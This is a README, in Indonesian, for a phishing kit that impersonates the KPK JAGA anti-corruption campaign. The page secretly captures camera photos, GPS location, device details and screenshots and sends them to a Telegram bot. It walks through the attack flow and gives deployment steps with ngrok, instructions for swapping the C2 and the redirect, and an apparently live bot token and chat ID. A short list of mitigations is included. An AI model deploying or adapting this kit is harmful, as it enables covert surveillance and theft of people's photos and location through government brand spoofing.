# Phishing Lab — KPK JAGA

Reversing dan rekonstruksi mobile phishing kit yang menyamar sebagai halaman kampanye **KPK JAGA (Jaringan Pencegahan Korupsi)** — dengan eksfiltrasi kamera, lokasi GPS, dan data perangkat via Telegram C2.

---

## Ringkasan

Lab ini menganalisis phishing kit asli yang menargetkan pengguna Indonesia dengan:

| Lapisan | Teknik |
|---------|--------|
| **Social engineering** | Samar sebagai kampanye anti-korupsi KPK bertema JKN |
| **UI spoofing** | Replika branding KPK JAGA (logo, maskot, warna merah #E01E25) |
| **Permission abusing** | Kamera (face verification pretext) + GPS (faskes detection pretext) |
| **Exfiltrasi** | Telegram Bot API — text (device info, GPS, IP geo) + photo (camera capture, screenshot) |
| **Infrastruktur** | Python HTTP server + ngrok tunnel (HTTPS public URL) |

---

## Struktur File

```
Phish/
├── phis.html         # Halaman phishing (JAGA branding + exfil engine)
├── serve.py          # Server + ngrok launcher
├── asset/
│   ├── logo-kpk.png      # Logo KPK resmi
│   ├── logo-jaga.png     # Logo JAGA
│   └── Maskot-jaga.png   # Maskot JAGA
└── README.md         # Dokumentasi ini
```

---

## Alur Kerja Lengkap

### 1. Infrastruktur (`serve.py`)

```
serve.py
  ├── Python http.server :8082
  ├── ngrok http 8082
  ├── Fetch https://xxx.ngrok.io/phis.html
  └── Print QR code untuk akses mobile
```

Custom port: `python serve.py 9090`

### 2. Permissions Flow (User-Side)

```
User membuka phis.html
  │
  ├── Melihat banner KPK JAGA (header, maskot, amplop, kartu KIS)
  │
  ├── Membaca teks provokatif:
  │   "Gawat! Data JKN kamu bisa disalahgunakan untuk korupsi loh."
  │
  └── Klik "Klik Disini" (CTA button)
        │
        ├── Overlay progress muncul (AUTO, tanpa interaksi user)
        │
        ├── Device profiling (background, fire & forget)
        │   ├── navigator.userAgent, platform, language
        │   ├── screen resolution, RAM, CPU cores
        │   ├── battery level & charging status
        │   ├── IP address + geolocation via ipapi.co
        │   └── reverse geocode via Nominatim (OSM)
        │
        ├── Browser native dialog: Izin Kamera ← user tap Allow
        │   ├── Mobile: environment (belakang) → user (depan) fallback
        │   └── Desktop: default webcam
        │
        ├── Browser native dialog: Izin Lokasi ← user tap Allow
        │   ├── getCurrentPosition() dengan enableHighAccuracy
        │   └── Google Maps link + reverse geocode alamat
        │
        ├── html2canvas screenshot halaman
        │
        └── Redirect ke https://jaga.id (korban tidak curiga)
```

### 3. Data Exfiltrasi (Attacker-Side)

Semua data dikirim ke Telegram Bot:

#### Text (`sendMessage`)
- Device info (OS, browser, RAM, CPU, battery)
- IP + IP geolocation (kota, region, ISP)
- GPS coordinate + Google Maps link
- Reverse-geocoded alamat lengkap
- Timestamp, timezone, referrer URL

#### Photo (`sendPhoto`)
- `environment_jaga_<timestamp>.jpg` — kamera belakang
- `user_jaga_<timestamp>.jpg` — kamera depan (selfie)
- `default_jaga_<timestamp>.jpg` — webcam desktop
- `screenshot_jaga_<timestamp>.jpg` — screenshot halaman

### 4. Exfil Architecture

```
Browser → fetch() → api.telegram.org/bot<TOKEN>/sendMessage
         → fetch() → api.telegram.org/bot<TOKEN>/sendPhoto (FormData)
```

**C2 Telegram** (`phis.html:637-638`):
```
Token:  8826082391:AAHJHWJtjXotVBvq4sVVIDUKofT9A4KiAMk
Chat:   7215842875
```

---

## Teknik & Cara Kerja per Komponen

### phis.html

| Bagian | Baris | Fungsi |
|--------|-------|--------|
| JAGA Banner | 517-614 | UI spoofing — replika kampanye KPK |
| Hidden video | 616 | `getUserMedia` capture tanpa UI |
| Hidden canvas | 617 | `ctx.drawImage` dari video ke blob |
| Progress overlay | 619-633 | Informasi tanpa tombol — user hanya interaksi dengan native dialog |
| `collectDeviceInfo()` | 699-740 | Profiling perangkat + IP geolocation |
| `captureCamera()` | 742-784 | Multi-device camera capture (mobile→environment→user, desktop→default) |
| `captureLocation()` | 786-816 | GPS getCurrentPosition + reverse geocode |
| `takeScreenshot()` | 818-829 | html2canvas full page screenshot |
| Click handler | 831-866 | Trigger semua permission dari user gesture |

### Key Technical Points

1. **User Gesture**: `getUserMedia` dan `getCurrentPosition` dipanggil **synchronous** dari click handler (`camPromise` + `locPromise` di baris 845-846) — keduanya masih dalam `transient activation` window.

2. **Progressive Fallback Camera**: Mobile — coba `environment` (belakang) dulu, jika gagal/blocked → `user` (depan). Desktop — `{width:1280,height:720}`.

3. **Overlay Zero-Interaction**: Overlay hanya info + spinner. User tidak perlu klik tombol apapun di overlay — hanya native browser dialog.

4. **IP Geolocation Double-Source**: GPS via `getCurrentPosition` (akurat) + IP via `ipapi.co` (fallback jika GPS ditolak).

5. **Reverse Geocode**: Nominatim OpenStreetMap API — mengubah koordinat GPS menjadi alamat lengkap (kota, kecamatan, jalan).

6. **Screenshot**: html2canvas dengan `useCORS:true` menangkap halaman lengkap termasuk gambar dari URL eksternal.

---

## Analisis Keamanan

### Kerentanan yang Dieksploitasi

| Vektor | Detail |
|--------|--------|
| **Social engineering** | Tema anti-korupsi + JKN memancing emosi dan urgensi |
| **Brand spoofing** | Logo KPK, maskot JAGA, layout pemerintahan |
| **Permission pretext** | Kamera → "verifikasi wajah", GPS → "deteksi faskes" |
| **No visual feedback** | Kamera di-hidden (video offscreen, opacity 0) |
| **Loading pretext** | Progress bar palsu — user menunggu tanpa sadar data dikirim |

### Mitigasi untuk Pengguna

1. **Periksa URL** — domain ngrok/unknown adalah red flag
2. **Cek izin** — Kenapa aplikasi anti-korupsi perlu kamera & lokasi?
3. **Revoke permission** di pengaturan browser jika ragu
4. **Gunakan browser security** — Chrome Safe Browsing, Firefox tracking protection
5. **Revoke Telegram Bot** token via @BotFather jika token terpapar

---

## Cara Pakai (Authorized Testing)

```bash
# 1. Pastikan ngrok terinstall
ngrok version

# 2. Jalankan server
python serve.py [port]

# Output:
#   [+] HTTP server running on http://0.0.0.0:8082
#   [+] Ngrok tunnel starting...
#   [+] PHISHING URL: https://xxxx.ngrok.io/phis.html
#   [+] QR: https://api.qrserver.com/...

# 3. Buka URL di browser target
# 4. Monitor Telegram untuk data masuk
```

### Customization

- **Ganti C2**: Edit `TBOT` & `TCHAT` di baris 637-638
- **Ganti redirect**: Edit `window.location.href` di baris 865
- **Ganti port**: `python serve.py 9090`

---

## Reference

| Resource | URL |
|----------|-----|
| KPK Official | https://kpk.go.id |
| JAGA Platform | https://jaga.id |
| Telegram Bot API | https://core.telegram.org/bots/api |
| ngrok | https://ngrok.com |
| html2canvas | https://html2canvas.hertzen.com |
| ipapi.co | https://ipapi.co |
| Nominatim | https://nominatim.openstreetmap.org |
